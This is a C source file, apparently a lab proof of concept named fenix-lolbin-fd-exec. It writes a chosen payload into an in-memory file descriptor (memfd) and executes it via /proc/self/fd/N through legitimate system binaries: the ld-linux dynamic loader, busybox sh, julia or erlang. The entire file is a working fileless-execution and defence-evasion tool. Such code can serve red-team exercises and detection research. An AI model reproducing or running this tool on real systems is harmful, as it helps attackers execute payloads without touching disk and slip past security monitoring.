/*
 * fenix-lolbin-fd-exec — Execute payload from memfd via LoLbin + /proc/self/fd/N (lab PoC).
 * Linux-only.
 */
#include "fenix-common.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern char **environ;

static void usage(const char *prog)
{
    fprintf(stderr,
            "Usage: %s --payload <path> --lolbin <name> [--name <memfd_name>] [--bin <path>]\n"
            "       lolbin: ld-linux | busybox | julia | erlang\n",
            prog);
}

static int write_payload_to_memfd(const char *payload_path, int mfd)
{
    size_t len = 0;
    unsigned char *data = fenix_read_file(payload_path, &len);
    if (!data)
        return -1;
    int rc = fenix_write_all(mfd, data, len);
    free(data);
    return rc;
}

static int resolve_default_ld(char *buf, size_t bufsz)
{
    static const char *candidates[] = {
        "/lib64/ld-linux-x86-64.so.2",
        "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
        "/lib/aarch64-linux-gnu/ld-linux-aarch64.so.1",
        "/lib64/ld-linux-aarch64.so.1",
        NULL,
    };

    for (int i = 0; candidates[i]; i++) {
        if (access(candidates[i], X_OK) == 0) {
            snprintf(buf, bufsz, "%s", candidates[i]);
            return 0;
        }
    }
    return -1;
}

static int exec_lolbin(const char *lolbin, const char *bin, const char *fd_path)
{
    char *argv_ld[] = { (char *)bin, (char *)fd_path, NULL };
    char *argv_busybox[] = { (char *)bin, "sh", (char *)fd_path, NULL };
    char *argv_interp[] = { (char *)bin, (char *)fd_path, NULL };

    if (strcmp(lolbin, "ld-linux") == 0) {
        execve(bin, argv_ld, environ);
        perror("execve ld-linux");
        return -1;
    }
    if (strcmp(lolbin, "busybox") == 0) {
        execve(bin, argv_busybox, environ);
        perror("execve busybox");
        return -1;
    }
    if (strcmp(lolbin, "julia") == 0 || strcmp(lolbin, "erlang") == 0) {
        execve(bin, argv_interp, environ);
        perror("execve interpreter");
        return -1;
    }

    fprintf(stderr, "fenix-lolbin-fd-exec: unknown lolbin '%s'\n", lolbin);
    return -1;
}

int main(int argc, char **argv)
{
    const char *payload_path = NULL;
    const char *memfd_name = "fenix_lolbin";
    const char *lolbin = NULL;
    const char *bin_override = NULL;
    char ld_buf[256];

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--payload") == 0 && i + 1 < argc) {
            payload_path = argv[++i];
        } else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc) {
            memfd_name = argv[++i];
        } else if (strcmp(argv[i], "--lolbin") == 0 && i + 1 < argc) {
            lolbin = argv[++i];
        } else if (strcmp(argv[i], "--bin") == 0 && i + 1 < argc) {
            bin_override = argv[++i];
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            usage(argv[0]);
            return 0;
        } else {
            fprintf(stderr, "fenix-lolbin-fd-exec: unknown option: %s\n", argv[i]);
            usage(argv[0]);
            return 1;
        }
    }

    if (!payload_path || !lolbin) {
        fprintf(stderr, "fenix-lolbin-fd-exec: --payload and --lolbin are required\n");
        usage(argv[0]);
        return 1;
    }

    const char *bin = bin_override;
    if (!bin) {
        if (strcmp(lolbin, "ld-linux") == 0) {
            if (resolve_default_ld(ld_buf, sizeof(ld_buf)) != 0) {
                fprintf(stderr,
                        "fenix-lolbin-fd-exec: ld-linux linker not found; pass --bin\n");
                return 1;
            }
            bin = ld_buf;
        } else {
            fprintf(stderr, "fenix-lolbin-fd-exec: --bin required for lolbin '%s'\n", lolbin);
            return 1;
        }
    }

    if (access(bin, X_OK) != 0) {
        fprintf(stderr, "fenix-lolbin-fd-exec: not executable: %s\n", bin);
        perror("access");
        return 1;
    }

    int mfd = fenix_create_memfd_inheritable(memfd_name);
    if (mfd < 0) {
        perror("memfd_create");
        return 1;
    }

    if (write_payload_to_memfd(payload_path, mfd) != 0) {
        close(mfd);
        return 1;
    }

    if (lseek(mfd, 0, SEEK_SET) != 0) {
        perror("lseek");
        close(mfd);
        return 1;
    }

    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", mfd);

    exec_lolbin(lolbin, bin, fd_path);
    close(mfd);
    return 1;
}
